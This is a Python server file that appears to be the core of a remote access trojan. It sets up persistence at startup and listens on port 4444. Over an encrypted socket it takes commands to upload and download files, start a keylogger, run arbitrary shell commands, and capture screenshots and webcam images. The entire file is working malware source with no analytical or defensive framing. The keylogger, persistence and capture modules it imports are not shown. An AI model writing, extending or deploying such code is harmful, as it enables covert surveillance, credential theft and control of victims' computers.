# server.py

import socket
import threading
from .encryption import decrypt_data, encrypt_data
from .keylogger import start_keylogger
from .persistence import add_to_startup
from .utils import MAX_SIZE
from .modules import *

# Function to handle client requests
def handle_client(client_socket):
    while True:
        try:
            command = decrypt_data(client_socket.recv(MAX_SIZE)).decode()
            
            if command.lower() == 'exit':
                break
            elif command.startswith('upload'):
                _, filename = command.split()
                file_manager.receive_file(client_socket, filename)
            elif command.startswith('download'):
                _, filename = command.split()
                file_manager.send_file(client_socket, filename)
            elif command.startswith('keylog'):
                start_keylogger()
            elif command.startswith('exec'):
                _, cmd = command.split(' ', 1)
                output = remote_shell.execute_command(cmd)
                client_socket.send(encrypt_data(output.encode()))
            elif command.startswith('screenshot'):
                image_data = screen_capture.take_screenshot()
                client_socket.send(encrypt_data(image_data))
            elif command.startswith('webcam'):
                webcam_data = webcam_capture.capture()
                client_socket.send(encrypt_data(webcam_data))
            else:
                client_socket.send(encrypt_data("Invalid command.".encode()))
        except Exception as e:
            client_socket.send(encrypt_data(f"Error: {str(e)}".encode()))
    
    client_socket.close()

# Main function to start the server
def main():
    add_to_startup()

    host = '127.0.0.1'
    port = 4444

    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((host, port))
    server.listen(5)  # Allow multiple connections

    print("\033[91m" + """
    ██████╗ ███████╗███╗   ██╗██╗   ██╗███████╗███╗   ██╗
    ██╔══██╗██╔════╝████╗  ██║██║   ██║██╔════╝████╗  ██║
    ██████╔╝█████╗  ██╔██╗ ██║██║   ██║█████╗  ██╔██╗ ██║
    ██╔═══╝ ██╔══╝  ██║╚██╗██║╚██╗ ██╔╝██╔══╝  ██║╚██╗██║
    ██║     ███████╗██║ ╚████║ ╚████╔╝ ███████╗██║ ╚████║
    ╚═╝     ╚══════╝╚═╝  ╚═══╝  ╚═══╝  ╚══════╝╚═╝  ╚═══╝
    """ + "\033[0m")

    print(f"Listening on {host}:{port}...")

    while True:
        client_socket, client_address = server.accept()
        print(f"Connection from {client_address}")
        client_handler = threading.Thread(target=handle_client, args=(client_socket,))
        client_handler.start()

if __name__ == '__main__':
    main()
